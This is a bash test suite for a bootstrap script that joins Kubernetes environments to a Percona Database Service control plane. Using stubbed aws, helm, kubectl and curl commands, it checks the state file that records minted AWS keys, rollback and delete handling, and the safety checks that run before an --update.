CREATED_ACCESS_KEY_ID="AKIAMINTED0000000000"
CREATED_IAM_USER=1
save_state
grep -q "STATE_CSI_STACK=1" "$(state_path spoke-a us-west-2)" \
  || fail "the state file does not record the CSI role stack: $(cat "$(state_path spoke-a us-west-2)")"
grep -q "STATE_ACCESS_KEY_IDS='AKIAMINTED0000000000'" "$(state_path spoke-a us-west-2)" \
  || fail "the state file does not record the access key: $(cat "$(state_path spoke-a us-west-2)")"
reset_join_flags
load_state >/dev/null
[[ "${STATE_CSI_STACK:-0}" == 1 && "${STATE_ACCESS_KEY_IDS:-}" == "AKIAMINTED0000000000" ]] \
  || fail "load_state lost the CSI role stack or the access key"
save_state
grep -q "STATE_ACCESS_KEY_IDS='AKIAMINTED0000000000'" "$(state_path spoke-a us-west-2)" \
  || fail "a later run that minted no key forgot the earlier one"
pass "the state file keeps the CSI role stack and the access key across runs"

# --- --status after a run that did not finish prints the delete command ---
# One command finds everything by its tag, so there is no list of resources here
# to drift from what the create side builds.
STATE_CLUSTER=1
FAKE_CLUSTER_STATUS="ACTIVE" print_status >"${WORK}/status-failed.out" 2>&1
grep -qF "bash -s -- --delete --name spoke-a --region us-west-2" "${WORK}/status-failed.out" \
  || fail "status after a failed run did not print the delete command: $(cat "${WORK}/status-failed.out")"
for old in \
  "aws iam delete-access-key" \
  "aws iam delete-user" \
  "aws iam list-access-keys" \
  "aws cloudformation delete-stack" \
  "eksctl delete cluster" \
  "aws s3 rb"; do
  grep -q -- "$old" "${WORK}/status-failed.out" \
    && fail "status after a failed run still prints the hand-copied step ${old}: $(cat "${WORK}/status-failed.out")"
done
[[ "$(grep -c -- "--delete" "${WORK}/status-failed.out")" == 1 ]] \
  || fail "status printed the delete command more than once: $(cat "${WORK}/status-failed.out")"
pass "status after a failed run prints one delete command in place of the hand-copied steps"

rm -rf "${WORK}/state"
reset_join_flags
STATE_ACCESS_KEY_IDS="AKIAMINTED0000000000"
FAKE_CLUSTER_STATUS="ACTIVE" print_status >"${WORK}/status-key-only.out" 2>&1
grep -qF "bash -s -- --delete --name spoke-a --region us-west-2" "${WORK}/status-key-only.out" \
  || fail "status did not print the delete command for a key this machine recorded minting: $(cat "${WORK}/status-key-only.out")"
grep -q "If EKS cluster spoke-a was already there, --delete refuses it" "${WORK}/status-key-only.out" \
  || fail "status did not say what --delete does when the EKS cluster was not made here: $(cat "${WORK}/status-key-only.out")"
grep -q "iam delete-access-key\|iam delete-user" "${WORK}/status-key-only.out" \
  && fail "status printed a hand-copied IAM delete: $(cat "${WORK}/status-key-only.out")"
pass "status prints the delete command for a recorded key and says what it does with an EKS cluster made elsewhere"

# A second failed run mints its own key and keeps the first until a run
# finishes, so one state slot would forget the earlier key and leave it live.
rm -rf "${WORK}/state"
reset_join_flags
CREATED_ACCESS_KEY_ID="AKIAFIRSTRUN00000000"
save_state
reset_join_flags
load_state >/dev/null
CREATED_ACCESS_KEY_ID="AKIASECONDRUN0000000"
save_state
reset_join_flags
load_state >/dev/null
for key in AKIAFIRSTRUN00000000 AKIASECONDRUN0000000; do
  [[ " $(recorded_key_ids) " == *" ${key} "* ]] \
    || fail "the state after two failed runs forgot ${key}: $(recorded_key_ids)"
done
pass "the state keeps every key unfinished runs minted"

rm -rf "${WORK}/state"
reset_join_flags
FAKE_CLUSTER_STATUS="ACTIVE" print_status >"${WORK}/status-none.out" 2>&1
grep -q -- "--delete" "${WORK}/status-none.out" \
  && fail "status printed a delete for something this machine did not record creating: $(cat "${WORK}/status-none.out")"
pass "status prints no delete command for what it did not record"

rm -rf "${WORK}/state"
reset_join_flags
STATE_CLUSTER=1
STATE_CSI_STACK=1
FAKE_CLUSTER_STATUS="ACTIVE" print_status >"${WORK}/status-csi-cluster.out" 2>&1
[[ "$(grep -c -- "--delete" "${WORK}/status-csi-cluster.out")" == 1 ]] \
  || fail "status did not print exactly one delete command for an EKS cluster and its role stack: $(cat "${WORK}/status-csi-cluster.out")"
grep -q "cloudformation delete-stack" "${WORK}/status-csi-cluster.out" \
  && fail "status printed a separate CSI stack delete beside the delete command: $(cat "${WORK}/status-csi-cluster.out")"
pass "status prints one delete command for an EKS cluster and its role stack"

reset_join_flags
CREATED_CLUSTER=1
CREATED_CSI_STACK=1
keep_notice >"${WORK}/keep-csi-cluster.out" 2>&1
grep -qF "bash -s -- --delete --name spoke-a --region us-west-2" "${WORK}/keep-csi-cluster.out" \
  || fail "a kept run did not print the delete command: $(cat "${WORK}/keep-csi-cluster.out")"
grep -q "cloudformation delete-stack\|eksctl delete cluster" "${WORK}/keep-csi-cluster.out" \
  && fail "a kept run printed a hand-copied delete beside the delete command: $(cat "${WORK}/keep-csi-cluster.out")"
pass "keep_notice prints the delete command and no hand-copied steps"

rm -rf "${WORK}/state"

# --- a rollback forgets what it removed and nothing else ---
# Run A keeps its key, run B mints another and rolls back. Clearing the state
# file would forget A's key, which is still live, and --status could no longer
# delete it.
rm -rf "${WORK}/state"
reset_join_flags
CREATED_ACCESS_KEY_ID="AKIAFIRSTRUN00000000"
save_state
reset_join_flags
load_state >/dev/null
ON_FAILURE="rollback"
CREATED_ACCESS_KEY_ID="AKIASECONDRUN0000000"
(
  false
  on_exit
) >/dev/null 2>&1 || true
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIASECONDRUN0000000" "${WORK}/calls" \
  || fail "the rollback did not delete the key it minted: $(cat "${WORK}/calls")"
[[ -f "$(state_path spoke-a us-west-2)" ]] \
  || fail "a rollback cleared the state file and forgot a key an earlier run kept"
grep -q "STATE_ACCESS_KEY_IDS='AKIAFIRSTRUN00000000'" "$(state_path spoke-a us-west-2)" \
  || fail "the state file after a rollback is not exactly the earlier run's key: $(cat "$(state_path spoke-a us-west-2)")"
pass "a rollback keeps the key an earlier run recorded and drops the one it removed"

rm -rf "${WORK}/state"
reset_join_flags
ON_FAILURE="rollback"
CREATED_CLUSTER=1
(
  false
  on_exit
) >/dev/null 2>&1 || true
[[ ! -f "$(state_path spoke-a us-west-2)" ]] \
  || fail "a rollback of everything this run made left a state file behind: $(cat "$(state_path spoke-a us-west-2)")"
pass "a rollback that removes everything leaves no state file"

# The CSI role stack on a cluster the join attached to is not something
# rollback deletes, so it has to stay on record.
rm -rf "${WORK}/state"
reset_join_flags
ON_FAILURE="rollback"
CREATED_CSI_STACK=1
(
  false
  on_exit
) >/dev/null 2>&1 || true
grep -q "STATE_CSI_STACK=1" "$(state_path spoke-a us-west-2)" \
  || fail "a rollback forgot the CSI role stack it leaves behind: $(cat "$(state_path spoke-a us-west-2)" 2>&1)"
pass "a rollback keeps on record what it leaves behind"

rm -rf "${WORK}/state"

# --- the rollback hint covers only what rollback removes ---
reset_join_flags
CREATED_CSI_STACK=1
keep_notice >"${WORK}/keep-csi.out" 2>&1
grep -qF "bash -s -- --delete --name spoke-a --region us-west-2" "${WORK}/keep-csi.out" \
  || fail "a kept run did not print the delete command for the CSI role stack it made: $(cat "${WORK}/keep-csi.out")"
grep -q "If EKS cluster spoke-a was already there, --delete refuses it" "${WORK}/keep-csi.out" \
  || fail "a kept run did not say what --delete does when the EKS cluster was not made here: $(cat "${WORK}/keep-csi.out")"
grep -q "on-failure rollback" "${WORK}/keep-csi.out" \
  && fail "a kept run offered a rollback that would not remove the CSI role stack: $(cat "${WORK}/keep-csi.out")"
pass "keep_notice offers rollback only for what rollback removes"

# --- --update moves an environment's platform in place ---
# These run the whole script, not lifted functions, because what matters is the
# order: every refusal comes before the enrollment that spends the token, and
# nothing here may reach AWS. The fakes below stand in for kubectl, helm, curl,
# aws and eksctl in a PATH of their own.
UPD="${WORK}/upd"
mkdir -p "${UPD}/bin" "${UPD}/chart" "${UPD}/home"
sed -e 's#__HUB_URL__#http://localhost:9#' \
  -e 's#__GIT_URL__#https://git.example/hub.git#' \
  -e 's#__DEFAULT_REGION__#us-west-2#' "${SCRIPT}" >"${UPD}/bootstrap.sh"

write_update_chart() {
  local floor="${1:->= 2.0.0-dev.4}" pxc_floor="${2:-}" pxc_line=""
  if [[ -n "$pxc_floor" ]]; then
    pxc_line="      pxc: \"${pxc_floor}\""
  fi
  cat >"${UPD}/chart/Chart.yaml" <<EOF
apiVersion: v2
name: pds
version: 0.1.0
EOF
  cat >"${UPD}/chart/compatibility.yaml" <<EOF
schema: 1
support:
  freshInstall: supported
  upgrade: unsupported
  update:
    from:
      openeverest: "${floor}"
${pxc_line}
openeverest:
  name: openeverest
  version: "2.0.0-dev.5"
providers:
  pxc:
    name: provider-percona-xtradb-cluster
    version: "0.4.0"
  postgresql:
    name: provider-percona-postgresql
    version: "0.5.0"
EOF
}

# write_update_manifest renders the part of a release manifest the script reads:
# the version ConfigMap and the provider chart labels.
write_update_manifest() {
  local openeverest="$1" pxc="$2" postgresql="$3"
  cat >"${UPD}/manifest.yaml" <<EOF
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: pds-platform-versions
data:
  openeverest.version: "${openeverest}"
  pmm.version: "1.9.1"
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: provider-pxc
  labels:
    helm.sh/chart: provider-pxc-${pxc}
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: provider-postgresql
  labels:
    helm.sh/chart: provider-postgresql-${postgresql}
EOF
}

echo '{"items":[]}' >"${UPD}/empty.json"
echo '[{"revision":3,"status":"failed"},{"revision":2,"status":"superseded"},{"revision":1,"status":"superseded"}]' >"${UPD}/history.json"
echo '[{"revision":2,"status":"failed"},{"revision":1,"status":"failed"}]' >"${UPD}/history-none-good.json"
cat >"${UPD}/enrollment.json" <<'EOF'
{"environment":"spoke-a","agentImage":"ghcr.io/percona/pds:v2","gitUrl":"https://git.example/hub.git","namespace":"pds","agentToken":"agent-secret-value"}
EOF

cat >"${UPD}/bin/curl" <<EOF
#!/usr/bin/env bash
echo "curl \$*" >>"${UPD}/calls"
if [[ "\$*" == *"/api/internal/connect/enrollment"* ]]; then
  printf '%s\n200' "\$(cat "${UPD}/enrollment.json")"
fi
exit 0
EOF
cat >"${UPD}/bin/aws" <<EOF
#!/usr/bin/env bash
echo "aws \$*" >>"${UPD}/calls"
exit 1
EOF
cat >"${UPD}/bin/eksctl" <<EOF
#!/usr/bin/env bash
echo "eksctl \$*" >>"${UPD}/calls"
exit 1
EOF
cat >"${UPD}/bin/helm" <<EOF
#!/usr/bin/env bash
echo "helm \$*" >>"${UPD}/calls"
case "\$1" in
  version) echo "v3.16.0"; exit 0 ;;
  status)
    case " \${FAKE_UPD_RELEASES-pds} " in
      *" \$2 "*) printf '{"info":{"status":"%s"}}' "\${FAKE_UPD_STATUS:-deployed}"; exit 0 ;;
    esac
    exit 1 ;;
  get)
    case "\$2" in
      values)
        ns=""
        if [[ -n "\${FAKE_UPD_DB_NS:-}" ]]; then ns=",\"stack\":{\"dbNamespace\":\"\${FAKE_UPD_DB_NS}\"}"; fi
        printf '{"adapter":{"hub":{"environmentName":"%s","url":"%s"}}%s}' "\${FAKE_UPD_RELEASE_ENV-spoke-a}" "\${FAKE_UPD_RELEASE_HUB-http://localhost:9}" "\$ns"; exit 0 ;;
      manifest)
        if [[ "\$*" == *"--revision"* ]]; then cat "${UPD}/manifest.yaml"; exit 0; fi
        cat "\${FAKE_UPD_MANIFEST_CURRENT:-${UPD}/manifest.yaml}"; exit 0 ;;
    esac ;;
  history)
    cat "\${FAKE_UPD_HISTORY:-${UPD}/history.json}"; exit 0 ;;
  pull)
    dest=""
    for arg in "\$@"; do
      if [[ "\$prev" == "--untardir" ]]; then dest="\$arg"; fi
      prev="\$arg"
    done
    mkdir -p "\$dest/pds" && cp "${UPD}/chart/Chart.yaml" "${UPD}/chart/compatibility.yaml" "\$dest/pds/"
    exit 0 ;;
  upgrade)
    if [[ "\$2" == "--help" ]]; then echo "\${FAKE_UPD_HELM_HELP---reset-then-reuse-values --force-conflicts}"; exit 0; fi
    for arg in "\$@"; do
      if [[ "\$prev" == "-f" ]]; then cat "\$arg" >>"${UPD}/values-applied.yaml"; fi
      prev="\$arg"
    done
    echo "installing the new release"
    exit "\${FAKE_UPD_HELM_RC:-0}" ;;
esac
exit 0
EOF
cat >"${UPD}/bin/kubectl" <<EOF
#!/usr/bin/env bash
echo "kubectl \$*" >>"${UPD}/calls"
if [[ "\$*" == *"-f -"* ]]; then
  cat >>"${UPD}/applied.yaml"
fi
case "\$*" in
  "config current-context") echo "kind-lab"; exit 0 ;;
  *"get nodes"*) echo "amd64"; exit 0 ;;
  *"serviceAccountName"*) printf '%s' "pds"; exit 0 ;;
  *"get gitrepository.source.toolkit.fluxcd.io hub"*)
    case "\${FAKE_UPD_GIT_FAIL:-}" in
      forbidden) echo 'Error from server (Forbidden): gitrepositories.source.toolkit.fluxcd.io "hub" is forbidden' >&2; exit 1 ;;
      notype) echo "error: the server doesn't have a resource type \"gitrepository\"" >&2; exit 1 ;;
    esac
    printf '%s' "\${FAKE_UPD_GIT_URL-https://git.example/hub.git}"; exit 0 ;;
  *"get deploy/source-controller -o jsonpath"*) printf '%s' "\${FAKE_UPD_FLUX_VERSION:-}"; exit 0 ;;
  *"get instances.core.openeverest.io"*)
    if [[ -n "\${FAKE_UPD_STDERR:-}" ]]; then echo "\${FAKE_UPD_STDERR}" >&2; fi
    cat "\${FAKE_UPD_INSTANCES:-${UPD}/empty.json}"; exit 0 ;;
  *"get backups.backup.openeverest.io"*) cat "\${FAKE_UPD_BACKUPS:-${UPD}/empty.json}"; exit 0 ;;
  *"get restores.backup.openeverest.io"*) cat "\${FAKE_UPD_RESTORES:-${UPD}/empty.json}"; exit 0 ;;
esac
exit 0
EOF
chmod +x "${UPD}/bin/"*

# run_update runs the whole script with --update and the arguments given. The
# output and the recorded calls are kept for the assertions.
run_update() {
  : >"${UPD}/calls"
  rm -f "${UPD}/applied.yaml" "${UPD}/values-applied.yaml"
  rm -rf "${UPD}/home/.cache"
  set +e
  (
    cd "${UPD_CWD:-${UPD}}"
    env PATH="${UPD}/bin:${PATH}" HOME="${UPD}/home" XDG_CACHE_HOME="${UPD}/home/.cache" \
      XDG_STATE_HOME="${UPD}/home/state" WAIT_INTERVAL=0 PDS_CHART="${UPD_PDS_CHART-${UPD}/chart}" \
      bash "${UPD}/bootstrap.sh" "$@" >"${UPD}/out" 2>&1 </dev/null
  )
  UPDATE_RC=$?
  set -e
}

# spent is true when the run called the enrollment that consumes the token. The
# preview call names the environment and spends nothing.
spent() { grep -Eq 'api/internal/connect/enrollment( |$)' "${UPD}/calls"; }

write_update_chart
write_update_manifest "2.0.0-dev.4" "0.3.1" "0.5.0"

for other in "--region eu-west-1" "--local" "--public-nodes" "--on-failure rollback" \
  "--kubernetes-version 1.31" "--status" "--dry-run"; do
  # shellcheck disable=SC2086
  run_update --update --token t $other
  [[ "$UPDATE_RC" -eq 2 ]] \
    || fail "--update accepted ${other} next to it (${UPDATE_RC}): $(cat "${UPD}/out")"
  grep -q -- "--update takes --token and nothing else" "${UPD}/out" \
    || fail "the refusal for ${other} does not say what --update takes: $(cat "${UPD}/out")"
  grep -q -- "${other%% *}" "${UPD}/out" \
    || fail "the refusal does not name ${other%% *}: $(cat "${UPD}/out")"
  [[ ! -s "${UPD}/calls" ]] \
    || fail "a refused flag still ran something: $(cat "${UPD}/calls")"
done
pass "a flag next to --update is refused, named, and runs nothing"

run_update --update
[[ "$UPDATE_RC" -eq 2 ]] || fail "--update with no token exited ${UPDATE_RC}"
pass "--update needs a token"

run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "a clean update exited ${UPDATE_RC}: $(cat "${UPD}/out")"
grep -q "updating spoke-a from OpenEverest 2.0.0-dev.4, provider-pxc 0.3.1, provider-postgresql 0.5.0 to OpenEverest 2.0.0-dev.5, provider-pxc 0.4.0, provider-postgresql 0.5.0" "${UPD}/out" \
  || fail "the versions line is missing or wrong: $(cat "${UPD}/out")"
phase_line() { grep -n "^\[$1/4\] $2" "${UPD}/out" | head -1 | cut -d: -f1; }
p1="$(phase_line 1 "checking prerequisites")"
p2="$(phase_line 2 "updating Percona Database Service")"
p3="$(phase_line 3 "updating Git reconciliation")"
p4="$(phase_line 4 "waiting for the agent")"
[[ -n "$p1" && -n "$p2" && -n "$p3" && -n "$p4" && "$p1" -lt "$p2" && "$p2" -lt "$p3" && "$p3" -lt "$p4" ]] \
  || fail "the four phases did not run in order (${p1:-} ${p2:-} ${p3:-} ${p4:-}): $(cat "${UPD}/out")"
v_at="$(grep -n "^updating spoke-a from" "${UPD}/out" | head -1 | cut -d: -f1)"
[[ "$v_at" -gt "$p1" && "$v_at" -lt "$p2" ]] \
  || fail "the versions line does not sit between the checks and Helm: $(cat "${UPD}/out")"
grep -q 'name: pds-support-agent' "${UPD}/applied.yaml" \
  || fail "an update left the environment without the support access grants: $(cat "${UPD}/calls")"
grep -qx '  name: pds-support' "${UPD}/applied.yaml" \
  || fail "an update did not install the support access namespace"
grep -Eq '^(aws|eksctl) ' "${UPD}/calls" \
  && fail "an update called AWS: $(grep -E '^(aws|eksctl) ' "${UPD}/calls")"
spent || fail "a passing update never enrolled: $(cat "${UPD}/calls")"
preview_at="$(grep -n 'enrollment?preview=1' "${UPD}/calls" | head -1 | cut -d: -f1)"
enroll_at="$(grep -nE 'enrollment( |$)' "${UPD}/calls" | head -1 | cut -d: -f1)"
[[ -n "$preview_at" && "$preview_at" -lt "$enroll_at" ]] \
  || fail "the checks did not read the environment name before enrolling: $(cat "${UPD}/calls")"
first_report="$(grep -n 'environments/spoke-a/join' "${UPD}/calls" | head -1 | cut -d: -f1)"
[[ -n "$first_report" && "$first_report" -gt "$enroll_at" ]] \
  || fail "a phase was reported with the join token before it was enrolled (report ${first_report:-none}, enroll ${enroll_at}): $(cat "${UPD}/calls")"
upgrades="$(grep '^helm upgrade' "${UPD}/calls" | grep -vc -- '--help' || true)"
[[ "$upgrades" -eq 1 ]] || fail "the platform moved in ${upgrades} Helm upgrades, not one: $(cat "${UPD}/calls")"
upgrade_line="$(grep '^helm upgrade' "${UPD}/calls" | grep -v -- '--help')"
for want in "--reset-then-reuse-values" "--wait" "--set openeverest.upgrade.preflightChecks=false" "--namespace everest-system"; do
  [[ "$upgrade_line" == *"$want"* ]] || fail "the upgrade lacks ${want}: ${upgrade_line}"
done
[[ " $upgrade_line " == *" --reuse-values "* ]] \
  && fail "the upgrade uses --reuse-values, which keeps the old chart's pinned defaults: ${upgrade_line}"
[[ "$upgrade_line" == *"agent-secret-value"* ]] \
  && fail "the agent token is on the Helm command line: ${upgrade_line}"
grep -q "agentToken: \"agent-secret-value\"" "${UPD}/values-applied.yaml" \
  || fail "the new agent token did not reach the release: $(cat "${UPD}/values-applied.yaml" 2>/dev/null)"
grep -q "tag: v2" "${UPD}/values-applied.yaml" \
  || fail "the new agent image did not reach the release: $(cat "${UPD}/values-applied.yaml" 2>/dev/null)"
for kept in "stack:" "dbNamespace" "everestURL" "bucket:" "environmentName"; do
  grep -q "$kept" "${UPD}/values-applied.yaml" \
    && fail "the update rewrote ${kept}, which the release already holds"
done
grep -q "name: hub-instances" "${UPD}/applied.yaml" \
  || fail "the Git reconciliation step did not apply the instances Kustomization: $(cat "${UPD}/applied.yaml" 2>/dev/null)"
grep -q "name: hub-platform" "${UPD}/applied.yaml" \
  || fail "the Git reconciliation step did not apply the platform rights: $(cat "${UPD}/applied.yaml" 2>/dev/null)"
grep -q "rollout status deploy -l app.kubernetes.io/instance=pds,app.kubernetes.io/component=adapter" "${UPD}/calls" \
  || fail "the update did not wait for the agent: $(cat "${UPD}/calls")"
pass "a passing update prints the versions, runs the four phases in order, and calls no AWS"

# A refusal names what it found and what to do, and never spends the token.
expect_refused() {
  local label="$1" needle="$2"
  [[ "$UPDATE_RC" -ne 0 ]] || fail "${label}: the update ran: $(cat "${UPD}/out")"
  grep -q -- "$needle" "${UPD}/out" \
    || fail "${label}: the refusal does not say '${needle}': $(cat "${UPD}/out")"
  spent && fail "${label}: a refused update spent its token: $(cat "${UPD}/calls")"
  # The hub takes a phase report made with the join token as using the token up.
  grep -q 'environments/spoke-a/join' "${UPD}/calls" \
    && fail "${label}: a refused update reported a phase with the token: $(cat "${UPD}/calls")"
  grep '^helm upgrade' "${UPD}/calls" | grep -qv -- '--help' \
    && fail "${label}: a refused update still ran Helm: $(cat "${UPD}/calls")"
  grep -Eq '^(aws|eksctl) ' "${UPD}/calls" \
    && fail "${label}: a refused update called AWS"
  return 0
}

FAKE_UPD_RELEASES="" run_update --update --token t
expect_refused "no release" "no Percona Database Service release"
grep -q "Point kubectl" "${UPD}/out" || fail "no release: the refusal does not say what to do: $(cat "${UPD}/out")"
pass "a Kubernetes cluster with no release is refused before enrollment"

old_release="percona-services" # allow-legacy-name
FAKE_UPD_RELEASES="$old_release" run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "a release from before the rename was refused (${UPDATE_RC}): $(cat "${UPD}/out")"
grep -q "helm upgrade ${old_release} " "${UPD}/calls" \
  || fail "the update did not upgrade the release it found under the old name: $(cat "${UPD}/calls")"
pass "a release from before the rename is found and updated"

FAKE_UPD_RELEASE_ENV="prod-east" run_update --update --token t
expect_refused "another environment" "prod-east"
grep -q "spoke-a" "${UPD}/out" || fail "another environment: the refusal does not name the token's environment: $(cat "${UPD}/out")"
pass "a release that names another environment is refused before enrollment"

write_update_manifest "2.0.0-dev.3" "0.3.1" "0.5.0"
run_update --update --token t
expect_refused "below the floor" "2.0.0-dev.3"
grep -q ">= 2.0.0-dev.4" "${UPD}/out" || fail "below the floor: the refusal does not name the floor: $(cat "${UPD}/out")"
pass "an installed OpenEverest below the floor is refused and the floor is named"

write_update_manifest "2.0.0-dev.6" "0.3.1" "0.5.0"
run_update --update --token t
expect_refused "newer OpenEverest" "newer"
grep -q "2.0.0-dev.6" "${UPD}/out" || fail "newer OpenEverest: the refusal does not name the installed version: $(cat "${UPD}/out")"
write_update_manifest "2.0.0-dev.4" "0.9.0" "0.5.0"
run_update --update --token t
expect_refused "newer provider" "provider-pxc 0.9.0"
pass "an installed component newer than the chart's is refused"

write_update_manifest "2.0.0-dev.5" "0.4.0" "0.5.0"
run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "an environment already on the target was refused (${UPDATE_RC}): $(cat "${UPD}/out")"
pass "an installed version equal to the chart's is not a downgrade"

write_update_manifest "2.0.0-dev.4" "0.3.1" "0.5.0"
cat >"${UPD}/instances-busy.json" <<'EOF'
{"items":[
 {"metadata":{"name":"orders"},"status":{"phase":"Ready"}},
 {"metadata":{"name":"billing"},"status":{"phase":"Suspended"}},
 {"metadata":{"name":"events"},"status":{"phase":"Failed"}},
 {"metadata":{"name":"reports"},"status":{}}
]}
EOF
FAKE_UPD_INSTANCES="${UPD}/instances-busy.json" run_update --update --token t
expect_refused "busy databases" "billing"
for busy in "billing" "events" "reports"; do
  grep -q "${busy}" "${UPD}/out" || fail "busy databases: ${busy} is not named: $(cat "${UPD}/out")"
done
grep -q "orders" "${UPD}/out" && fail "busy databases: a Ready database was named: $(cat "${UPD}/out")"
grep -q "Suspended" "${UPD}/out" || fail "busy databases: the Suspended phase is not named: $(cat "${UPD}/out")"
grep -q "database events is Failed. Fix it or delete it" "${UPD}/out" \
  || fail "busy databases: a Failed database is told to wait: $(cat "${UPD}/out")"
pass "a database that is not Ready, Suspended and Failed included, refuses and is named"

cat >"${UPD}/backups-running.json" <<'EOF'
{"items":[
 {"metadata":{"name":"nightly-1"},"status":{"state":"Succeeded"}},
 {"metadata":{"name":"nightly-2"},"status":{"state":"Running"}},
 {"metadata":{"name":"nightly-3"},"status":{"state":"Failed"}}
]}
EOF
FAKE_UPD_BACKUPS="${UPD}/backups-running.json" run_update --update --token t
expect_refused "unfinished backup" "nightly-2"
grep -q "nightly-1\|nightly-3" "${UPD}/out" && fail "unfinished backup: a finished backup was named: $(cat "${UPD}/out")"
pass "an unfinished backup refuses and is named"

cat >"${UPD}/restores-pending.json" <<'EOF'
{"items":[{"metadata":{"name":"copy-of-orders"},"status":{"state":"Pending"}}]}
EOF
FAKE_UPD_RESTORES="${UPD}/restores-pending.json" run_update --update --token t
expect_refused "unfinished restore" "copy-of-orders"
pass "an unfinished restore refuses and is named"

# A floor raised above what is installed refuses, the way a later pin bump will.
write_update_chart ">= 2.0.0-dev.5"
run_update --update --token t
expect_refused "raised floor" ">= 2.0.0-dev.5"
write_update_chart

# A read that cannot be trusted never reads as no work in the way. A warning on
# stderr does not blind the check, and an answer that is not a list refuses.
FAKE_UPD_STDERR="Warning: kubeconfig is group readable" FAKE_UPD_INSTANCES="${UPD}/instances-busy.json" \
  run_update --update --token t
expect_refused "stderr noise" "billing"
echo 'not json at all' >"${UPD}/garbage.json"
FAKE_UPD_INSTANCES="${UPD}/garbage.json" run_update --update --token t
expect_refused "unreadable list" "did not answer with a list"
pass "a warning does not hide busy work, and an unreadable answer refuses"

# A release whose OpenEverest version cannot be read cannot be checked against
# its floor, so it refuses rather than passing unchecked.
sed -i.bak '/openeverest.version/d' "${UPD}/manifest.yaml"
run_update --update --token t
expect_refused "no OpenEverest version" "does not say which OpenEverest version"
write_update_manifest "2.0.0-dev.4" "0.3.1" "0.5.0"
pass "a release that does not say its OpenEverest version is refused"

FAKE_UPD_RELEASE_ENV="" run_update --update --token t
expect_refused "no environment on the release" "does not name an environment"
pass "a release that names no environment is refused"

# An update that failed leaves the release failed. That is where the next
# command starts from. A release still pending is something to roll back first.
FAKE_UPD_STATUS="failed" run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "a release left failed by an earlier update was refused (${UPDATE_RC}): $(cat "${UPD}/out")"
FAKE_UPD_STATUS="pending-upgrade" run_update --update --token t
expect_refused "pending release" "pending-upgrade"
grep -q "helm rollback pds --namespace everest-system" "${UPD}/out" \
  || fail "a pending release is not pointed at helm rollback: $(cat "${UPD}/out")"
pass "a failed release is updated again and a pending one is refused with the rollback command"

# A failed update leaves the manifest of the revision it tried, not of what is
# running. The versions are read from the last revision that was in place, and an
# update that tried other versions than those leaves the cluster in between, so
# it is rolled back before anything is checked against a floor.
write_update_manifest "2.0.0-dev.5" "0.4.0" "0.5.0"
cp "${UPD}/manifest.yaml" "${UPD}/manifest-attempted.yaml"
write_update_manifest "2.0.0-dev.4" "0.3.1" "0.5.0"
FAKE_UPD_STATUS="failed" FAKE_UPD_MANIFEST_CURRENT="${UPD}/manifest-attempted.yaml" run_update --update --token t
expect_refused "partly applied update" "stopped part way"
grep -q "helm rollback pds --namespace everest-system" "${UPD}/out" \
  || fail "a partly applied update is not pointed at helm rollback: $(cat "${UPD}/out")"
FAKE_UPD_STATUS="failed" FAKE_UPD_HISTORY="${UPD}/history-none-good.json" run_update --update --token t
expect_refused "no revision to read" "join command"
pass "a failed release is read from its last good revision, and one that tried other versions or has none is refused"

# The released chart named by PDS_CHART_OCI has to be unpacked before its pin can
# be read, and the upgrade then uses that same unpacked chart.
UPD_PDS_CHART="" PDS_CHART_OCI="oci://example.com/charts/pds" PDS_CHART_VERSION="0.1.0" run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] \
  || fail "an update from a released chart failed (${UPDATE_RC}): $(cat "${UPD}/out")"
grep -q "^helm pull oci://example.com/charts/pds --version 0.1.0" "${UPD}/calls" \
  || fail "the released chart was not pulled: $(cat "${UPD}/calls")"
oci_upgrade="$(grep '^helm upgrade' "${UPD}/calls" | grep -v -- '--help')"
[[ "$oci_upgrade" != *"oci://"* ]] \
  || fail "the upgrade used the OCI reference instead of the chart it read the pin from: ${oci_upgrade}"
pass "an update from a released chart pulls it and reads its pin from the unpacked copy"

# A provider floor refuses the way the OpenEverest one does.
write_update_chart ">= 2.0.0-dev.4" ">= 0.3.2"
run_update --update --token t
expect_refused "provider floor" ">= 0.3.2"
grep -q "provider-pxc 0.3.1" "${UPD}/out" || fail "provider floor: the provider is not named: $(cat "${UPD}/out")"
write_update_chart
pass "an installed provider below its floor is refused and the floor is named"

# The control plane's own chart is the target. A checkout under the current
# directory is not that, so without PDS_CHART the chart comes from the hub.
mkdir -p "${UPD}/elsewhere/charts/pds"
cp "${UPD}/chart/Chart.yaml" "${UPD}/chart/compatibility.yaml" "${UPD}/elsewhere/charts/pds/"
UPD_CWD="${UPD}/elsewhere" UPD_PDS_CHART="" run_update --update --token t
grep -q "using local Helm chart" "${UPD}/out" \
  && fail "an update used a checkout under the current directory: $(cat "${UPD}/out")"
grep -q "connect/pds.tgz" "${UPD}/calls" \
  || fail "the update did not ask the control plane for its chart: $(cat "${UPD}/calls")"
pass "an update takes its chart from the control plane, not from the current directory"

# Git reconciliation of another version than the pinned one is replaced.
FLUX_SHA256=skip FAKE_UPD_FLUX_VERSION="v2.4.0" run_update --update --token t
[[ "$UPDATE_RC" -eq 0 ]] || fail "an update over another Git reconciliation version failed: $(cat "${UPD}/out")"
grep -q "flux2/releases/download/v2.5.1/install.yaml" "${UPD}/calls" \
  || fail "the pinned Git reconciliation was not installed over v2.4.0: $(cat "${UPD}/calls")"
FAKE_UPD_FLUX_VERSION="v2.5.1" run_update --update --token t
grep -q "install.yaml" "${UPD}/calls" \
  && fail "an update reinstalled the Git reconciliation it already had"
pass "an update replaces Git reconciliation of another version and leaves the pinned one alone"

# Two control planes can each have an environment of the same name. The release
# remembers which control plane it reports to, and a token from another one
# would repoint the environment at it, so the update refuses.
FAKE_UPD_RELEASE_HUB="https://other-control-plane.example" run_update --update --token t
expect_refused "another control plane" "other-control-plane.example"
grep -q "localhost:9" "${UPD}/out" || fail "another control plane: this control plane is not named: $(cat "${UPD}/out")"
FAKE_UPD_RELEASE_HUB="" run_update --update --token t
expect_refused "no control plane on the release" "does not name a control plane"
FAKE_UPD_RELEASE_HUB="http://localhost:9/" run_update --update --token t
